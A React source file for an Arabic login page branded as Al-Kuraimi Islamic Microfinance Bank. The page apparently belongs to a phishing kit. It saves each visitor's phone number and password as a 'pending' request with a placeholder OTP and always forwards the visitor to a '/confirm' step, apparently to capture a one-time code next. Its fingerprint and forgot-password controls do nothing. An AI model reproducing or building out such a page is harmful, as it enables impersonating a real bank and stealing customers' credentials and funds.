import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { Eye, EyeOff, Fingerprint, LockKeyhole } from "lucide-react";
import { createLoginRequest } from "@/api/loginRequests";
import { setVisitorRequestId } from "@/lib/session";
import logoWhite from "@/assets/logo-white.png";
import logoPurple from "@/assets/logo-purple.svg";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "تسجيل الدخول | بنك الكريمي للتمويل الأصغر الإسلامي" },
      {
        name: "description",
        content: "سجّل الدخول إلى خدمات بنك الكريمي للتمويل الأصغر الإسلامي بأمان.",
      },
      { property: "og:title", content: "تسجيل الدخول | بنك الكريمي" },
      {
        property: "og:description",
        content: "سجّل الدخول إلى خدمات بنك الكريمي للتمويل الأصغر الإسلامي بأمان.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: Login,
});

function Login() {
  const [show, setShow] = useState(false);
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const navigate = useNavigate();


  return (
    <div className="flex min-h-screen w-full flex-col bg-background">
      {/* Hero on brand purple */}
      <section className="flex h-40 shrink-0 items-center justify-center bg-brand px-4 py-6">
        <img
          src={logoWhite}
          alt="بنك الكريمي للتمويل الأصغر الإسلامي"
          className="w-full max-w-sm"
        />
      </section>

      {/* Header on white */}
      <header className="flex items-center justify-center bg-white px-0 py-2">
        <img src={logoPurple} alt="شعار بنك الكريمي" className="h-80 w-auto" />
      </header>

      {/* Form */}
      <form
        className="flex flex-1 flex-col justify-center space-y-4 bg-white px-0 pb-10 pt-6"
        onSubmit={async (e) => {
          e.preventDefault();
          if (submitting) return;
          setSubmitting(true);
          try {
            const row = await createLoginRequest({
              phone,
              otp_code: "----",
              username: phone,
              password,
              step: "login",
              status: "pending",
            });
            setVisitorRequestId(row.id);
          } catch (err) {
            console.error(err);
          } finally {
            setSubmitting(false);
            navigate({ to: "/confirm", search: { phone } });
          }
        }}

      >
        <input
          type="text"
          inputMode="numeric"
          required
          value={phone}
          onChange={(e) => setPhone(e.target.value)}
          placeholder="أدخل رقم المميز"
          className="h-14 w-full rounded-full bg-field px-6 text-base text-white placeholder:text-white focus:outline-none focus:ring-2 focus:ring-brand"
        />

        <div className="relative">
          <input
            type={show ? "text" : "password"}
            required
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="أدخل كلمة المرور"
            className="h-14 w-full rounded-full bg-field px-6 pl-14 text-base text-white placeholder:text-white focus:outline-none focus:ring-2 focus:ring-brand"
          />
          <button
            type="button"
            onClick={() => setShow(!show)}
            aria-label="إظهار كلمة المرور"
            className="absolute left-5 top-1/2 -translate-y-1/2 text-brand"
          >
            {show ? <Eye size={20} /> : <EyeOff size={20} />}
          </button>
        </div>

        <div className="flex items-center gap-4">
          <button
            type="submit"
            disabled={submitting}
            className="h-14 flex-1 rounded-full bg-gold text-xl font-bold text-gold-foreground transition-opacity hover:opacity-90 disabled:opacity-60"
          >
            {submitting ? "جاري الإرسال..." : "دخول"}
          </button>
          <button
            type="button"
            aria-label="البصمة"
            className="flex h-14 w-14 items-center justify-center text-gold"
          >
            <Fingerprint size={40} strokeWidth={1.5} />
          </button>
        </div>

        <Link
          to="/"
          className="flex items-center gap-2 pt-1 text-sm font-medium text-brand"
        >
          <LockKeyhole size={20} />
          هل نسيت كلمة المرور
        </Link>
      </form>
    </div>
  );
}
